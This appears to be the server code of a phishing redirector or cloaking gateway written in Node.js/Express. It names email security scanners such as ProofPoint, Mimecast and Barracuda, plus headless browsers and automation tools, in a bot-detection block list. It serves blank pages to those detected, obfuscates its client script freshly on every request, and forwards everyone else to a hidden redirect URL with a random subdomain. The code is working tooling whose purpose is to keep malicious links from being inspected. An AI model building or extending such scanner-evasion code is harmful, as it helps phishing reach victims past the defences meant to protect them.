const express = require('express');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Trust proxy for Railway/Vercel/etc to get real client IP
app.set('trust proxy', true);

// Helper to get real client IP from forwarded headers
function getClientIP(req) {
    // X-Forwarded-For can contain multiple IPs: "client, proxy1, proxy2"
    const forwarded = req.get('x-forwarded-for');
    if (forwarded) {
        return forwarded.split(',')[0].trim();
    }
    // Fallback to other headers or direct IP
    return req.get('x-real-ip') || req.ip || req.connection.remoteAddress;
}

// Generate random subdomain using crypto
function generateRandomSubdomain() {
    return crypto.randomBytes(6).toString('hex'); // 12 hex chars
}

// ============================================
// CONFIGURATION - REDIRECT URL FROM ENV ONLY
// ============================================
const REDIRECT_URL = process.env.REDIRECT_URL;

if (!REDIRECT_URL) {
    console.error('❌ ERROR: REDIRECT_URL environment variable is not set!');
    console.error('Set it with: export REDIRECT_URL=https://your-destination.com');
    console.error('Or in Railway: Add REDIRECT_URL in Variables tab');
    process.exit(1);
}

// Rate limiting storage (in-memory, use Redis for production)
const rateLimitStore = new Map();
const fingerprintStore = new Map();

// Security headers to prevent email scanners from caching/previewing
app.use((req, res, next) => {
    // Prevent caching
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');

    // Additional security headers
    res.setHeader('X-Robots-Tag', 'noindex, nofollow');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Referrer-Policy', 'no-referrer');

    // Remove server header
    res.removeHeader('X-Powered-By');

    next();
});

// Parse JSON for API endpoints
app.use(express.json({ limit: '10kb' }));

// Advanced bot detection middleware
app.use((req, res, next) => {
    // Skip bot detection for JavaScript files and API endpoints
    if (req.path.endsWith('.js') || req.path.startsWith('/api/') || req.path === '/health') {
        return next();
    }

    req.botScore = 0;
    req.botSignals = [];

    const userAgent = req.get('user-agent') || '';
    const acceptHeader = req.get('accept') || '';
    const acceptLanguage = req.get('accept-language') || '';
    const acceptEncoding = req.get('accept-encoding') || '';

    // 1. User-Agent Analysis (comprehensive patterns)
    const botPatterns = [
        // Email scanners
        /ProofPoint/i, /Mimecast/i, /Barracuda/i, /SafeRedirect/i,
        /EmailScanner/i, /MailScanner/i, /ATP/i, /Advanced.*Threat/i,
        /Link.*Scanner/i, /Security.*Scanner/i, /URL.*Scanner/i,
        /IronPort/i, /FortiMail/i, /Sophos/i,

        // Headless browsers
        /HeadlessChrome/i, /PhantomJS/i, /Nightmare/i,

        // Automation frameworks
        /Selenium/i, /WebDriver/i, /Puppeteer/i, /Playwright/i,
        /Cypress/i, /TestCafe/i, /ChromeDriver/i,

        // Common bots
        /bot/i, /crawl/i, /spider/i, /scrape/i,

        // HTTP libraries
        /curl/i, /wget/i, /python-requests/i, /python-urllib/i,
        /node-fetch/i, /axios/i, /okhttp/i, /Apache-HttpClient/i,
        /Java\//i, /Go-http-client/i, /libwww-perl/i,

        // Monitoring tools
        /monitor/i, /check/i, /validator/i, /preview/i,
        /uptime/i, /pingdom/i, /StatusCake/i
    ];

    const isBotUA = botPatterns.some(pattern => pattern.test(userAgent));

    if (isBotUA) {
        req.botScore += 60;  // Increased - strong signal
        req.botSignals.push('bot-ua');
    }

    // 2. Only flag completely missing user-agent (definitive bot signal)
    if (!userAgent || userAgent.length < 5) {
        req.botScore += 50;
        req.botSignals.push('missing-ua');
    }

    // 3. Rate limiting by IP
    const clientIP = getClientIP(req);
    const now = Date.now();
    const rateLimitWindow = 60000; // 1 minute
    const maxRequests = 10;

    if (!rateLimitStore.has(clientIP)) {
        rateLimitStore.set(clientIP, [now]);
    } else {
        const requests = rateLimitStore.get(clientIP).filter(time => now - time < rateLimitWindow);
        requests.push(now);
        rateLimitStore.set(clientIP, requests);

        if (requests.length > maxRequests) {
            req.botScore += 40;
            req.botSignals.push('rate-limit-exceeded');
        }
    }

    // Clean up old rate limit entries
    if (Math.random() < 0.01) {
        for (const [ip, requests] of rateLimitStore.entries()) {
            const validRequests = requests.filter(time => now - time < rateLimitWindow);
            if (validRequests.length === 0) {
                rateLimitStore.delete(ip);
            } else {
                rateLimitStore.set(ip, validRequests);
            }
        }
    }

    // 9. If score is very high, block immediately (server-side only)
    if (req.botScore >= 80) {
        console.log(`[BLOCKED] IP: ${clientIP}, UA: ${userAgent}, Score: ${req.botScore}, Signals: ${req.botSignals.join(', ')}`);
        return res.status(200).send('<!DOCTYPE html><html><head><title>Page</title><meta name="robots" content="noindex"></head><body></body></html>');
    }

    // Log suspicious requests
    if (req.botScore >= 40) {
        console.log(`[SUSPICIOUS] IP: ${clientIP}, UA: ${userAgent}, Score: ${req.botScore}, Signals: ${req.botSignals.join(', ')}`);
    }

    next();
});

// API endpoint to verify client-side bot detection
app.post('/api/verify-human', (req, res) => {
    const { fingerprint, behaviors, clientScore, checks, urlParams } = req.body;

    if (!fingerprint || !behaviors) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    // Combine server-side and client-side scores
    let totalScore = req.botScore || 0;
    const signals = [...(req.botSignals || [])];

    // Behavioral analysis - REMOVED: Don't penalize for no interaction
    // Real humans may not interact before the page loads/redirects
    // Only use definitive bot signals from client-side checks

    // Add client-side score (weighted)
    totalScore += (clientScore || 0) * 0.5;

    // Check for CDP detection (very strong signal)
    if (checks && checks.cdp) {
        totalScore += 60;  // CDP is extremely reliable
        signals.push('cdp-detected');
    }

    if (checks && checks.webdriver) {
        totalScore += 70;  // WebDriver flag is definitive
        signals.push('webdriver-detected');
    }

    // Automation artifacts (Selenium, Puppeteer, Playwright)
    if (checks && checks.automationArtifacts && checks.automationArtifacts.length > 0) {
        totalScore += 65;
        signals.push('automation-artifacts');
    }

    // Headless browser detection
    if (checks && checks.headlessSignals && checks.headlessSignals.length >= 2) {
        totalScore += 50;  // Multiple headless signals
        signals.push('headless-browser');
    }

    // Store fingerprint for analysis
    const clientIP = getClientIP(req);
    const fpHash = crypto.createHash('md5').update(JSON.stringify(fingerprint)).digest('hex');

    if (fingerprintStore.has(fpHash)) {
        const stored = fingerprintStore.get(fpHash);
        stored.count++;
        stored.lastSeen = Date.now();

        // If same fingerprint from different IPs (suspicious)
        if (stored.ip !== clientIP) {
            totalScore += 20;
            signals.push('fingerprint-reuse');
        }
    } else {
        fingerprintStore.set(fpHash, {
            ip: clientIP,
            count: 1,
            firstSeen: Date.now(),
            lastSeen: Date.now()
        });
    }

    // Clean up old fingerprints
    if (Math.random() < 0.01) {
        const maxAge = 24 * 60 * 60 * 1000; // 24 hours
        const now = Date.now();
        for (const [hash, data] of fingerprintStore.entries()) {
            if (now - data.lastSeen > maxAge) {
                fingerprintStore.delete(hash);
            }
        }
    }

    // Decision - adjusted thresholds
    // Rely more on CDP detection, user-agent, and fingerprinting
    // Less on behavioral patterns alone
    const isBot = totalScore >= 80;
    const verdict = totalScore >= 100 ? 'bot' :
        totalScore >= 80 ? 'likely-bot' :
            totalScore >= 50 ? 'suspicious' :
                'human';

    // Log decision
    console.log(`[VERIFICATION] IP: ${clientIP}, Verdict: ${verdict}, Score: ${totalScore}, Signals: ${signals.join(', ')}`);

    // Build final redirect URL with query params and path
    let finalRedirectUrl = null;
    if (!isBot && REDIRECT_URL) {
        try {
            const baseUrl = new URL(REDIRECT_URL);

            // Add random subdomain to the host
            const randomSubdomain = generateRandomSubdomain();
            baseUrl.hostname = `${randomSubdomain}.${baseUrl.hostname}`;

            // Append path if provided
            if (urlParams && urlParams.path) {
                baseUrl.pathname = urlParams.path;
            }

            // Append query string if provided
            if (urlParams && urlParams.query) {
                baseUrl.search = urlParams.query;
            }

            finalRedirectUrl = baseUrl.toString();
        } catch (e) {
            // If URL parsing fails, use original
            finalRedirectUrl = REDIRECT_URL;
        }
    }

    res.json({
        allowed: !isBot,
        verdict: verdict,
        score: totalScore,
        signals: signals,
        redirectUrl: finalRedirectUrl
    });
});

// API endpoint for proof-of-work challenge
app.post('/api/challenge', (req, res) => {
    // Generate challenge
    const challenge = crypto.randomBytes(16).toString('hex');
    const difficulty = 4; // Number of leading zeros required

    res.json({
        challenge: challenge,
        difficulty: difficulty,
        timestamp: Date.now()
    });
});

// API endpoint to verify proof-of-work
app.post('/api/verify-pow', (req, res) => {
    const { challenge, nonce, timestamp } = req.body;

    if (!challenge || nonce === undefined || !timestamp) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    // Check timestamp (challenge should be recent)
    const now = Date.now();
    if (now - timestamp > 30000) {
        return res.json({ valid: false, reason: 'Challenge expired' });
    }

    // Verify proof of work
    const hash = crypto.createHash('sha256')
        .update(challenge + nonce)
        .digest('hex');

    const valid = hash.startsWith('0000'); // 4 leading zeros

    res.json({ valid: valid });
});

// Serve static files
app.use(express.static(path.join(__dirname)));

// Generate random filename for bot detection script
function generateRandomFilename() {
    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

// Function to generate obfuscated JS with random identifiers
function generateObfuscatedJS() {
    const fs = require('fs');
    const template = fs.readFileSync(path.join(__dirname, 'au0cki7gbr.js'), 'utf8');

    // Generate random identifiers (must start with letter for valid JS)
    const randId = () => {
        const chars = 'abcdefghijklmnopqrstuvwxyz';
        const first = chars[Math.floor(Math.random() * chars.length)];
        const rest = Math.random().toString(36).substring(2, 10);
        return first + rest;
    };

    const mappings = {
        // Don't obfuscate class name - it's used in HTML
        // 'AdvancedBotDetector': randId(),
        'detectCDP': randId(),
        'detectWebDriver': randId(),
        'detectHeadless': randId(),
        'checkNavigatorInconsistencies': randId(),
        'checkAutomationArtifacts': randId(),
        'generateFingerprint': randId(),
        'getCanvasFingerprint': randId(),
        'getWebGLFingerprint': randId(),
        'getAudioFingerprint': randId(),
        'getFontFingerprint': randId(),
        'getScreenFingerprint': randId(),
        'getBrowserFingerprint': randId(),
        'startBehaviorTracking': randId(),
        'waitForBehavior': randId(),
        'calculateScore': randId(),
        'simpleHash': randId(),
        'getResult': randId(),
        'checkPermissionsAsync': randId(),
        'cdpWeight': randId(),
        'behaviorWeight': randId(),
        'fingerprintWeight': randId(),
        'timingWeight': randId(),
        'navigatorWeight': randId(),
        'behaviorTimeout': randId(),
        'mouseMove': randId(),
        'startTime': randId(),
        'botScore': randId(),
        'botSignals': randId()
    };

    let obfuscated = template;

    // Replace all identifiers with random ones
    for (const [original, random] of Object.entries(mappings)) {
        const regex = new RegExp(`\\b${original}\\b`, 'g');
        obfuscated = obfuscated.replace(regex, random);
    }

    return obfuscated;
}

// HTML template function - generates page dynamically
function generateHTML(scriptName) {
    // Check if index.html exists, if so use it (for easier development)
    // Otherwise use embedded template
    const fs = require('fs');
    const htmlPath = path.join(__dirname, 'index.html');

    if (fs.existsSync(htmlPath)) {
        const htmlTemplate = fs.readFileSync(htmlPath, 'utf8');
        return htmlTemplate.replace(/src="au0cki7gbr\.js"/, `src="${scriptName}"`);
    }

    // Fallback: embedded HTML template (plain white background)
    return `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow"><title>Loading...</title></head>
<body style="margin:0;background:#fff">
<script src="${scriptName}"></script>
<script>
(async function(){
try{
const d=new AdvancedBotDetector({behaviorTimeout:3000,threshold:80});
const r=await d.detect();
const u={path:window.location.pathname!=='/'?window.location.pathname:null,query:window.location.search||null};
const res=await fetch('/api/verify-human',{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({fingerprint:r.fingerprint,behaviors:r.behaviors,clientScore:r.score,checks:r.checks,urlParams:u})});
const s=await res.json();
if(s.allowed&&s.redirectUrl){window.location.href=s.redirectUrl;}
else{document.body.innerHTML='<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-family:sans-serif;color:#333">Access Denied</div>';}
}catch(e){console.error(e);}
})();
</script>
<noscript><meta http-equiv="refresh" content="0;url=about:blank"></noscript>
</body></html>`;
}

// Main route
app.get('/', (req, res) => {
    // Generate random script name for this request
    const randomScriptName = generateRandomFilename() + '.js';

    // Generate HTML with random script name
    const html = generateHTML(randomScriptName);

    // Pass server-side bot score to client
    const initialScore = req.botScore || 0;
    res.cookie('_ss', initialScore, { httpOnly: false, maxAge: 60000 });
    res.send(html);
});

// Serve dynamically obfuscated bot detection script
app.get('/:randomname.js', (req, res) => {
    const obfuscatedJS = generateObfuscatedJS();
    res.setHeader('Content-Type', 'application/javascript');
    res.send(obfuscatedJS);
});

// Health check endpoint for Railway
app.get('/health', (req, res) => {
    res.status(200).json({ status: 'ok' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).send('<!DOCTYPE html><html><head><title>Not Found</title></head><body><h1>404 - Not Found</h1></body></html>');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
});
